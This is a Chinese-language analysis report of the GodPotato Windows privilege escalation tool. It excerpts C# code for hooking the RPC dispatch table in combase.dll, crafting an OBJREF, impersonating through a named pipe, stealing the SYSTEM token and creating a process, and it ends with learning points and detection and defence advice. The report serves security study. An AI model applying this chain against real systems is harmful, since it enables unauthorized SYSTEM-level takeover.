# GodPotato 项目分析报告

## 项目概述

GodPotato是一个Windows本地提权工具，基于DCOM/COM机制实现权限提升。该项目通过Hook RPC运行时库(combase.dll)中的函数，结合DCOM对象引用(OBJREF)构造和命名管道模拟，实现从普通用户权限提升到SYSTEM权限。

**项目来源**: https://github.com/BeichenDream/GodPotato
**适用系统**: Windows 2012-2019, Windows 8-10
**开发语言**: C# (.NET Framework 2.0)
**核心依赖**: SharpToken (令牌操作库)

---

## 功能分析

### 功能1: RPC运行时库Hook

#### 功能目的
通过修改combase.dll中的RPC服务器接口分发表(Dispatch Table)，将特定的RPC函数调用重定向到攻击者控制的代码，从而控制DCOM连接解析过程。

#### 实现方式

**代码位置**: [`NativeAPI/GodPotatoContext.cs`](GodPotato/NativeAPI/GodPotatoContext.cs:131-175)

```csharp
protected void InitContext() {
    ProcessModuleCollection processModules = Process.GetCurrentProcess().Modules;
    foreach (ProcessModule processModule in processModules)
    {
        if (processModule.ModuleName != null && processModule.ModuleName.ToLower() == "combase.dll")
        {
            CombaseModule = processModule.BaseAddress;
            // 搜索特定RPC接口
            var s = Sunday.Search(dllContent, patternStream.ToArray());
            // 获取分发表指针
            RPC_SERVER_INTERFACE rpcServerInterface = (RPC_SERVER_INTERFACE)Marshal.PtrToStructure(...);
            MIDL_SERVER_INFO midlServerInfo = (MIDL_SERVER_INFO)Marshal.PtrToStructure(...);
            DispatchTablePtr = midlServerInfo.DispatchTable;
            UseProtseqFunctionPtr = dispatchTable[0];
        }
    }
}
```

**Hook实现**: [`NativeAPI/GodPotatoContext.cs`](GodPotato/NativeAPI/GodPotatoContext.cs:281-287)

```csharp
public void HookRPC()
{
    uint old;
    VirtualProtect(DispatchTablePtr, (uint)(IntPtr.Size * dispatchTable.Length), 0x04, out old);
    Marshal.WriteIntPtr(DispatchTablePtr, Marshal.GetFunctionPointerForDelegate(useProtseqDelegate));
    IsHook = true;
}
```

**技术细节**:
1. 搜索combase.dll中的特定RPC接口GUID: `18f70770-8e64-11cf-9af1-0020af6e72f4` (IObjectExporter/OXID解析器接口)
2. 解析RPC_SERVER_INTERFACE结构获取分发表
3. 使用`VirtualProtect`修改内存保护属性为可写(0x04 = PAGE_READWRITE)
4. 将分发表第一个函数指针替换为自定义函数

**微软官方文档说明**:
根据[COM, DCOM, and Type Libraries文档](https://learn.microsoft.com/windows/win32/midl/com-dcom-and-type-libraries):
- DCOM使用RPC实现分布式组件对象通信
- COM接口定义了对象的身份和外部特征
- 客户端通过接口获取对象的方法和数据访问权限

---

### 功能2: 自定义RPC端点解析

#### 功能目的
当Hook生效后，控制RPC端点解析过程，将DCOM连接请求重定向到攻击者创建的命名管道，而非原始目标。

#### 实现方式

**代码位置**: [`NativeAPI/GodPotatoContext.cs`](GodPotato/NativeAPI/GodPotatoContext.cs:341-380) (NewOrcbRPC类)

```csharp
public int fun(IntPtr ppdsaNewBindings, IntPtr ppdsaNewSecurity)
{
    string[] endpoints = { godPotatoContext.clientPipe, "ncacn_ip_tcp:fuck you !" };
    
    // 构造DualStringArray结构
    int entrieSize = 3;
    for (int i = 0; i < endpoints.Length; i++)
    {
        entrieSize += endpoints[i].Length;
        entrieSize++;
    }
    
    // 写入自定义端点绑定信息
    IntPtr pdsaNewBindings = Marshal.AllocHGlobal(memroySize);
    Marshal.WriteInt16(pdsaNewBindings, offset, (short)entrieSize);
    // ... 写入端点字符串
    
    Marshal.WriteIntPtr(ppdsaNewBindings, pdsaNewBindings);
    return 0;
}
```

**技术细节**:
1. 函数接收两个参数: `ppdsaNewBindings`(新绑定信息)和`ppdsaNewSecurity`(安全绑定)
2. 构造包含攻击者命名管道路径的DualStringArray
3. 端点格式: `ncacn_np:localhost/pipe/GodPotato[\pipe\epmapper]`
4. 返回0表示成功，RPC运行时将使用新的绑定信息

**微软官方文档说明**:
根据[COM/DCOM类型库文档](https://learn.microsoft.com/windows/win32/midl/com-dcom-and-type-libraries):
- COM和DCOM使用RPC实现分布式组件对象通信
- DCOM协议透明地提供可靠、安全、高效的COM组件间通信
- OXID(Object Exporter ID)是对象导出器的唯一标识符，用于定位DCOM对象所在进程
- 客户端解组OBJREF时会触发OXID解析过程，连接OXID解析器获取绑定信息

根据[DCOM安全增强文档](https://learn.microsoft.com/windows/win32/com/dcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1):
- RPCSS服务(rpcss.exe)是DCOM Service Control Manager，负责管理DCOM对象激活
- RPCSS服务负责OXID解析，将对象导出器标识符转换为可用的RPC绑定信息

---

### 功能3: OBJREF构造与DCOM触发

#### 功能目的
构造恶意DCOM对象引用(OBJREF)，触发RPCSS服务进行OXID解析，诱导其连接到攻击者的命名管道。

#### 实现方式

**代码位置**: [`NativeAPI/GodPotatoUnmarshalTrigger.cs`](GodPotato/NativeAPI/GodPotatoUnmarshalTrigger.cs:38-65)

```csharp
public int Trigger() {
    // 获取原始OBJREF
    moniker.GetDisplayName(bindCtx, null, out ppszDisplayName);
    byte[] objrefBytes = Convert.FromBase64String(ppszDisplayName.Replace("objref:", "").Replace(":", ""));
    ObjRef tmpObjRef = new ObjRef(objrefBytes);
    
    // 构造恶意OBJREF
    ObjRef objRef = new ObjRef(IID_IUnknown,
        new ObjRef.Standard(0, 1, tmpObjRef.StandardObjRef.OXID, 
            tmpObjRef.StandardObjRef.OID, tmpObjRef.StandardObjReflected.IPID,
            new ObjRef.DualStringArray(
                new ObjRef.StringBinding(TowerProtocol.EPM_PROTOCOL_TCP, "127.0.0.1"),
                new ObjRef.SecurityBinding(0xa, 0xffff, null))));
    
    // 解组对象，触发OXID解析
    return UnmarshalDCOM.UnmarshalObject(data, out ppv);
}
```

**OBJREF结构**: [`NativeAPI/ObjRef.cs`](GodPotato/NativeAPI/ObjRef.cs:36-233)

```csharp
internal class ObjRef {
    const uint Signature = 0x574f454d;  // "MEOW"
    
    internal class Standard {
        const ulong Oxid = 0x0703d84a06ec96cc;
        const ulong Oid = 0x539d029cce31ac;
        
        public readonly ulong OXID;  // 对象导出器标识符
        public readonly ulong OID;   // 对象标识符
        public readonly Guid IPID;   // 接口指针标识符
        public readonly DualStringArray DualStringArray;  // 绑定信息
    }
}
```

**技术细节**:
1. OBJREF签名: `0x574f454d` ("MEOW")
2. 使用`CreateObjrefMoniker`获取当前进程的OBJREF模板
3. 修改DualStringArray中的StringBinding，指向攻击者的端点
4. 调用`CoUnmarshalInterface`触发OXID解析过程

**微软官方文档说明**:
根据[CoUnmarshalInterface函数文档](https://learn.microsoft.com/windows/win32/api/combaseapi/nf-combaseapi-counmarshalinterface):
- 该函数使用之前写入流的数据初始化新创建的代理
- 从流中读取用于创建代理实例的CLSID
- 获取IMarshal指针进行解组操作
- 安全警告: 使用不可信数据调用此方法是安全风险

---

### 功能4: 命名管道服务器

#### 功能目的
创建命名管道服务器，等待RPCSS服务连接，然后进行令牌模拟获取SYSTEM权限。

#### 实现方式

**代码位置**: [`NativeAPI/GodPotatoContext.cs`](GodPotato/NativeAPI/GodPotatoContext.cs:177-264)

```csharp
protected void PipeServer()
{
    // 创建安全描述符允许所有人访问
    ConvertStringSecurityDescriptorToSecurityDescriptor("D:(A;OICI;GA;;;WD)", 1, out securityDescriptor, out securityDescriptorSize);
    
    // 创建命名管道
    pipeServerHandle = CreateNamedPipe(serverPipe, PIPE_ACCESS_DUPLEX, 
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 
        PIPE_UNLIMITED_INSTANCES, 521, 0, 123, ref securityAttributes);
    
    // 等待连接
    ConnectNamedPipe(pipeServerHandle, IntPtr.Zero);
    
    // 模拟客户端
    if (ImpersonateNamedPipeClient(pipeServerHandle))
    {
        systemIdentity = WindowsIdentity.GetCurrent();
        
        // 搜索SYSTEM令牌
        SharpToken.TokenuUils.ListProcessTokens(-1, processToken => {
            if (processToken.SID == "S-1-5-18" && 
                processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation &&
                processToken.IntegrityLevel >= SharpToken.IntegrityLevel.SystemIntegrity)
            {
                systemIdentity = new WindowsIdentity(processToken.TokenHandle);
                isFindSystemToken = true;
                return false;
            }
            return true;
        });
    }
}
```

**技术细节**:
1. 管道路径: `\\.\pipe\GodPotato\pipe\epmapper`（服务端），对应客户端路径`ncacn_np:localhost/pipe/GodPotato[\pipe\epmapper]`（见[`GodPotatoContext.cs:34-35`](GodPotato/NativeAPI/GodPotatoContext.cs:34)）
2. 安全描述符: `D:(A;OICI;GA;;;WD)` - 允许所有人(Everyone)完全访问(GA)、对象继承(OICI)
3. 使用`ImpersonateNamedPipeClient`模拟连接的客户端
4. 遍历进程令牌查找SYSTEM令牌(S-1-5-18)

**微软官方文档说明**:
根据[ImpersonateNamedPipeClient函数文档](https://learn.microsoft.com/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient):
- 该函数允许命名管道服务器端模拟客户端
- 调用后，管道文件系统将调用线程改为模拟客户端的安全上下文
- 模拟成功需要SeImpersonatePrivilege权限

---

### 功能5: 令牌搜索与提升

#### 功能目的
在获取初始模拟令牌后，遍历系统进程查找更高权限的SYSTEM令牌，实现完整的权限提升。

#### 实现方式

**代码位置**: [`SharpToken.cs`](GodPotato/SharpToken.cs:1-500)

```csharp
public static void ListProcessTokens(int targetProcessId, Func<ProcessTokenInfo, bool> callback)
{
    // 使用NtQuerySystemInformation获取系统句柄信息
    NtQuerySystemInformation(SystemExtendedHandleInformation, ...);
    
    // 遍历所有句柄
    foreach (var handleInfo in handleInfos)
    {
        // 复制句柄到当前进程
        NtDuplicateObject(sourceProcess, handle, currentProcess, ...);
        
        // 查询对象类型
        NtQueryObject(dupHandle, ObjectTypeInformation, ...);
        
        // 如果是令牌对象
        if (typeName == "Token")
        {
            // 获取令牌信息
            GetTokenInformation(dupHandle, TokenUser, ...);
            GetTokenInformation(dupHandle, TokenIntegrityLevel, ...);
            
            // 调用回调函数处理令牌
            callback(new ProcessTokenInfo { ... });
        }
    }
}
```

**技术细节**:
1. 使用`NtQuerySystemInformation`获取系统所有句柄
2. 使用`NtDuplicateObject`复制其他进程的句柄
3. 使用`NtQueryObject`判断句柄类型
4. 使用`GetTokenInformation`获取令牌详细信息
5. 筛选条件: SID为S-1-5-18(SYSTEM)、模拟级别>=Impersonation、完整性级别>=SystemIntegrity

---

### 功能6: 高权限进程创建

#### 功能目的
使用获取的SYSTEM令牌创建新进程，执行攻击者指定的命令。

#### 实现方式

**代码位置**: [`SharpToken.cs`](GodPotato/SharpToken.cs:463-466)

```csharp
public static bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, 
    string lpApplicationName, string lpCommandLine, uint dwCreationFlags, 
    IntPtr lpEnvironment, string lpCurrentDirectory, 
    ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
```

**调用示例**:
```csharp
TokenuUils.createProcessReadOut(ConsoleWriter, systemIdentity.Token, potatoArgs.cmd);
```

**技术细节**:
- 使用`CreateProcessWithTokenW`或`CreateProcessAsUserW`
- 创建标志包含`CREATE_NO_WINDOW`避免弹出窗口
- 通过管道重定向输出进行结果读取

---

## 功能组合使用分析

### 组合流程

GodPotato的各个功能按照以下顺序组合使用:

```
1. 初始化并Hook RPC运行时库 (功能1)
   ↓
2. 启动命名管道服务器 (功能4)
   ↓
3. 构造恶意OBJREF (功能3)
   ↓
4. 调用CoUnmarshalInterface触发OXID解析
   ↓
[RPCSS服务解析OBJREF，调用被Hook的函数]
   ↓
5. 自定义RPC端点解析返回攻击者管道路径 (功能2)
   ↓
[RPCSS服务连接到攻击者的命名管道]
   ↓
6. 模拟管道客户端获取令牌 (功能4)
   ↓
7. 搜索SYSTEM令牌 (功能5)
   ↓
8. 使用SYSTEM令牌创建进程 (功能6)
```

### 组合目的

这种组合利用了DCOM/OXID解析机制的信任关系:

1. **Hook机制**: 通过修改combase.dll中的分发表，控制RPC端点解析过程
2. **OXID解析漏洞**: RPCSS服务在解析OBJREF时会调用被Hook的函数获取绑定信息
3. **路径重定向**: 自定义函数返回攻击者的命名管道路径，而非真实路径
4. **权限传递**: RPCSS服务以高权限运行，连接管道时携带高权限令牌
5. **令牌提升**: 通过遍历进程令牌获取完整的SYSTEM令牌

---

## 技术学习要点

### 1. DCOM/OXID解析机制

**学习内容**:
- OXID(Object Exporter ID)的作用和解析过程
- OBJREF结构和序列化格式
- DualStringArray绑定信息构造
- RPCSS服务在DCOM中的角色

**关键概念**:
- **OXID**: 对象导出器标识符，用于定位DCOM对象所在进程
- **OID**: 对象标识符，标识特定对象实例
- **IPID**: 接口指针标识符，标识对象的特定接口
- **StringBinding**: 协议序列和网络地址的组合

### 2. RPC运行时库内部结构

**学习内容**:
- RPC_SERVER_INTERFACE结构
- MIDL_SERVER_INFO结构
- RPC分发表(Dispatch Table)机制
- 内存保护和代码注入技术

**关键结构**:
```csharp
RPC_SERVER_INTERFACE {
    uint Length;
    RPC_SYNTAX_IDENTIFIER InterfaceId;
    RPC_SYNTAX_IDENTIFIER TransferSyntax;
    IntPtr DispatchTable;      // 关键：分发表指针
    IntPtr InterpreterInfo;    // MIDL_SERVER_INFO指针
}

MIDL_SERVER_INFO {
    IntPtr DispatchTable;      // 函数指针数组
    IntPtr ProcString;         // 过程格式字符串
    IntPtr FmtStringOffset;    // 格式字符串偏移表
}
```

### 3. Windows令牌体系

**学习内容**:
- 主令牌与模拟令牌的区别
- 令牌完整性级别(Integrity Level)
- 令牌模拟级别(Impersonation Level)
- 特权(Privilege)和访问权限

**完整性级别**:
```csharp
IntegrityLevel {
    Untrusted = 0x00000000
    LowIntegrity = 0x00001000
    MediumIntegrity = 0x00002000
    HighIntegrity = 0x00003000
    SystemIntegrity = 0x00004000
    ProtectedProcess = 0x00005000
}
```

### 4. 系统句柄枚举技术

**学习内容**:
- NtQuerySystemInformation API使用
- 系统句柄信息结构
- 跨进程句柄复制
- 对象类型查询

**关键API**:
- `NtQuerySystemInformation`: 获取系统信息(包括所有句柄)
- `NtDuplicateObject`: 复制其他进程的句柄
- `NtQueryObject`: 查询对象类型和名称
- `GetTokenInformation`: 获取令牌详细信息

### 5. COM/Moniker编程

**学习内容**:
- IMoniker接口和对象引用
- CreateObjrefMoniker函数
- OBJREF Base64编码格式
- CoUnmarshalInterface调用流程

**关键API**:
- `CreateBindCtx`: 创建绑定上下文
- `CreateObjrefMoniker`: 创建对象引用Moniker
- `CoUnmarshalInterface`: 解组接口指针

### 6. 攻击检测与防御

**检测要点**:
- combase.dll内存修改检测
- 异常的RPC分发表修改
- OBJREF结构异常检测
- 命名管道路径异常监控

**防御措施**:
- 实施代码完整性保护
- 监控关键DLL内存修改
- 限制SeImpersonatePrivilege权限
- 部署EDR监控敏感API调用

---

## 与其他Potato技术的对比

| 特性 | GodPotato | BadPotato/PrintSpoofer | JuicyPotato |
|------|-----------|------------------------|-------------|
| 触发机制 | DCOM OXID解析Hook | Print Spooler RPC | DCOM激活请求 |
| 目标服务 | RPCSS | Print Spooler | 多种DCOM服务 |
| 适用系统 | Win2012-Win2019 | Win2012-Win2019 | Win2008-Win2016 |
| 权限要求 | SeImpersonatePrivilege | SeImpersonatePrivilege | SeImpersonatePrivilege |
| 技术复杂度 | 高(需要Hook) | 中 | 中 |
| 稳定性 | 较高 | 较高 | 较低 |

---

## 总结

GodPotato项目展示了Windows DCOM机制的深层安全风险。通过Hook RPC运行时库的核心函数，攻击者可以控制OXID解析过程，诱导高权限服务连接到可控资源，进而获取SYSTEM权限。

该技术的创新点在于:
1. 直接Hook系统DLL而非依赖特定服务行为
2. 利用DCOM基础设施的信任关系
3. 结合令牌枚举实现完整权限提升

理解GodPotato的原理对于深入理解Windows DCOM架构和安全边界具有重要意义。